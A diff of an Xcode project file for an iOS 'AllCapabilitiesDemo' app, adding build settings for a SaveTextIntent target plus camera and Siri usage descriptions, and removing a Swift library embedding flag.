+				MARKETING_VERSION = 1.0;
+				PRODUCT_BUNDLE_IDENTIFIER = com.appcaps.SaveTextIntent;
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = allcaps_dev;
+				SKIP_INSTALL = YES;
+				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_VERSION = 5.0;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
 		};
@@ -849,7 +1040,6 @@
 		BD2ECEE72D0841CC00639E0D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = AllCapabilitiesDemo/AllCapabilitiesDemo.entitlements;
@@ -861,8 +1051,10 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AllCapabilitiesDemo/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "We need camera access to track your head movement.";
 				INFOPLIST_KEY_NSHealthShareUsageDescription = "To Share Health Related Data to this app";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "For Location";
+				INFOPLIST_KEY_NSSiriUsageDescription = "Allows CoffeeApp to process coffee orders via Siri.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
@@ -887,7 +1079,6 @@
 		BD2ECEE82D0841CC00639E0D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = AllCapabilitiesDemo/AllCapabilitiesDemo.entitlements;
@@ -900,8 +1091,10 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 27A2DW4KWX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = AllCapabilitiesDemo/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "We need camera access to track your head movement.";
 				INFOPLIST_KEY_NSHealthShareUsageDescription = "To Share Health Related Data to this app";
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "For Location";
+				INFOPLIST_KEY_NSSiriUsageDescription = "Allows CoffeeApp to process coffee orders via Siri.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
@@ -926,7 +1119,6 @@
 		BD2ECEEA2D0841CC00639E0D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -945,7 +1137,6 @@
 		BD2ECEEB2D0841CC00639E0D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -964,7 +1155,6 @@
 		BD2ECEED2D0841CC00639E0D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -981,7 +1171,6 @@
 		BD2ECEEE2D0841CC00639E0D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -1007,11 +1196,11 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		51BBC6A82E40724000211F13 /* Build configuration list */ = {
+		51BBC7402E40DA1100211F13 /* Build configuration list for PBXNativeTarget "SaveTextIntent" */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
-				51BBC6A62E406F7000211F13 /* Debug */,
-				51BBC6A72E406F7000211F13 /* Release */,
+				51BBC7412E40DA1100211F13 /* Debug */,
+				51BBC7422E40DA1100211F13 /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
